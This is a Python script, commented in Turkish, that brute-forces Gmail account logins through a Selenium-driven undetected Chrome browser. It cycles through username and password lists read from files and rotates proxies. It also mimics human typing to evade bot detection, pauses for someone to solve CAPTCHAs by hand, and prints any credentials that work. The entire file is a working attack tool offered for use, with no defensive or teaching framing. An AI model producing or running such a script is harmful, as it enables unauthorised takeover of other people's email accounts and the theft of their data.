import undetected_chromedriver as uc
from selenium.webdriver.common.by import By
from selenium.webdriver.common.keys import Keys
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC
from selenium.webdriver.common.action_chains import ActionChains
import time
import random
import traceback

# Proxy listesi - buraya kendin IP:PORT yazabilirsin
proxies = [
    "http://111.111.111.111:8080",
    "http://222.222.222.222:8080",
    # daha fazlası...
]

options = uc.ChromeOptions()
options.add_argument('--no-sandbox')
options.add_argument('--disable-dev-shm-usage')
options.headless = False

def get_random_proxy():
    return random.choice(proxies)

def initialize_driver(proxy=None):
    try:
        opts = options
        if proxy:
            opts.add_argument(f'--proxy-server={proxy}')
        driver = uc.Chrome(options=opts)
        return driver
    except Exception as e:
        print(f"Driver init error: {e}")
        return None

def human_typing(element, text):
    for char in text:
        element.send_keys(char)
        time.sleep(random.uniform(0.1, 0.3))

def gmail_login(driver):
    url = 'https://accounts.google.com/signin/v2/identifier'
    username_file = '/root/Desktop/usernames.txt'
    password_file = '/root/Desktop/passwords.txt'

    with open(username_file, 'r') as uf:
        usernames = uf.read().splitlines()

    with open(password_file, 'r') as pf:
        passwords = pf.read().splitlines()

    for username in usernames:
        for password in passwords:
            try:
                if not driver:
                    proxy = get_random_proxy()
                    print(f"Yeni proxy ile driver başlatılıyor: {proxy}")
                    driver = initialize_driver(proxy=proxy)
                    if not driver:
                        print("Driver başlatılamadı, çıkılıyor.")
                        return

                driver.get(url)

                email_input = WebDriverWait(driver, 15).until(
                    EC.presence_of_element_located((By.XPATH, '//input[@type="email"]'))
                )
                email_input.clear()
                human_typing(email_input, username)
                email_input.send_keys(Keys.RETURN)

                time.sleep(random.uniform(2,4))  # insan davranışı taklidi

                # Şifre alanı yükleniyor
                for _ in range(5):
                    try:
                        password_input = WebDriverWait(driver, 15).until(
                            EC.presence_of_element_located((By.XPATH, '//input[@type="password"]'))
                        )
                        driver.execute_script("arguments[0].scrollIntoView(true);", password_input)
                        WebDriverWait(driver, 10).until(
                            EC.element_to_be_clickable((By.XPATH, '//input[@type="password"]'))
                        )
                        password_input.clear()
                        human_typing(password_input, password)
                        password_input.send_keys(Keys.RETURN)
                        break
                    except Exception as e:
                        print(f"Şifre alanı hatası: {e}")
                        time.sleep(2)

                time.sleep(5)

                page_source = driver.page_source.lower()
                if "wrong password" in page_source or "incorrect" in page_source:
                    print(f"Hatalı giriş: {username} | {password}")
                elif "challenge" in page_source or "captcha" in page_source:
                    print(f"Captcha ile karşılaşıldı. Lütfen manuel çöz.")
                    input("Captcha çözüldükten sonra Enter'a basın...")
                else:
                    print(f"Başarılı giriş: {username} | {password}")
                    return

            except Exception as e:
                print(f"Genel hata: {e}")
                traceback.print_exc()
                if driver:
                    driver.quit()
                proxy = get_random_proxy()
                print(f"Driver yeniden başlatılıyor proxy ile: {proxy}")
                driver = initialize_driver(proxy=proxy)
                if not driver:
                    print("Yeniden başlatma başarısız, çıkılıyor.")
                    return

    print("Tüm denemeler tamamlandı.")

if __name__ == "__main__":
    driver = initialize_driver()
    try:
        gmail_login(driver)
    finally:
        if driver:
            driver.quit()
